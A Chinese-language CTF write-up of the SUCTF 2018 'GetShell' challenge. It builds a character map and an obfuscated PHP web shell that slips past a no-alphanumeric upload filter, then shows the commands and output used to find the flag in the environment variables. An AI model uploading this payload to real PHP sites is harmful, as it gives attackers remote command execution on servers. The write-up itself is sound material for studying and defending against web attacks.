# [SUCTF 2018]GetShell
![](<./img/Pasted image 20230220192219.png>)

```
/index.php
```

![](<./img/Pasted image 20230220192242.png>)

```
/index.php?act=upload
```

![](<./img/Pasted image 20230220192325.png>)

无字母数字RCE，考虑使用汉字绕过

生成字典

```python
s = '悲'
l = list(s.encode())

for i in list(range(65, 91)) + list(range(97, 123)):
    l[1] = ~i + 256
    print(bytes(l).decode() + ' ==> ' + chr(i))

# 澲 ==> A
# 潲 ==> B
# 漲 ==> C
# 滲 ==> D
# 溲 ==> E
# 湲 ==> F
# 渲 ==> G
# 淲 ==> H
# 液 ==> I
# 浲 ==> J
# 洲 ==> K
# 泲 ==> L
# 沲 ==> M
# 汲 ==> N
# 氲 ==> O
# 毲 ==> P
# 殲 ==> Q
# 歲 ==> R
# 欲 ==> S
# 櫲 ==> T
# 檲 ==> U
# 橲 ==> V
# 樲 ==> W
# 槲 ==> X
# 榲 ==> Y
# 楲 ==> Z
# 枲 ==> a
# 杲 ==> b
# 朲 ==> c
# 曲 ==> d
# 暲 ==> e
# 晲 ==> f
# 昲 ==> g
# 旲 ==> h
# 斲 ==> i
# 敲 ==> j
# 攲 ==> k
# 擲 ==> l
# 撲 ==> m
# 摲 ==> n
# 搲 ==> o
# 揲 ==> p
# 掲 ==> q
# 捲 ==> r
# 挲 ==> s
# 拲 ==> t
# 抲 ==> u
# 扲 ==> v
# 戲 ==> w
# 懲 ==> x
# 憲 ==> y
# 慲 ==> z
```

payload

```php
<?=$_=[];$__=$_==$_;$___=~挲[$__];$___.=~憲[$__];$___.=~挲[$__];$___.=~拲[$__];$___.=~暲[$__];$___.=~撲[$__];$____=_;$____.=~毲[$__];$____.=~氲[$__];$____.=~欲[$__];$____.=~櫲[$__];$___($$____[~枲[$__]]);
```

翻译过来是

```php
system($_POST['a']);
```

![](<./img/Pasted image 20230220193201.png>)

![](<./img/Pasted image 20230220193226.png>)

```shell
ls /
```

```
Th1s_14_f14g
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```shell
cat /Th1s_14_f14g
```

```
SUCTF{fake_flag_web_b}
```

假flag

找半天结果在环境变量里qaq

```shell
export
```

```shell
export APACHE_LOCK_DIR='/var/lock/apache2'
export APACHE_LOG_DIR='/var/log/apache2'
export APACHE_PID_FILE='/var/run/apache2/apache2.pid'
export APACHE_RUN_DIR='/var/run/apache2'
export APACHE_RUN_GROUP='www-data'
export APACHE_RUN_USER='www-data'
export FLAG='flag{4487500a-7f2b-4155-88ac-a52e58fddead}'
export HOSTNAME='out'
export KUBERNETES_PORT='tcp://10.240.0.1:443'
export KUBERNETES_PORT_443_TCP='tcp://10.240.0.1:443'
export KUBERNETES_PORT_443_TCP_ADDR='10.240.0.1'
export KUBERNETES_PORT_443_TCP_PORT='443'
export KUBERNETES_PORT_443_TCP_PROTO='tcp'
export KUBERNETES_SERVICE_HOST='10.240.0.1'
export KUBERNETES_SERVICE_PORT='443'
export KUBERNETES_SERVICE_PORT_HTTPS='443'
export LANG='C'
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
export PWD='/var/www/html/upload'
```
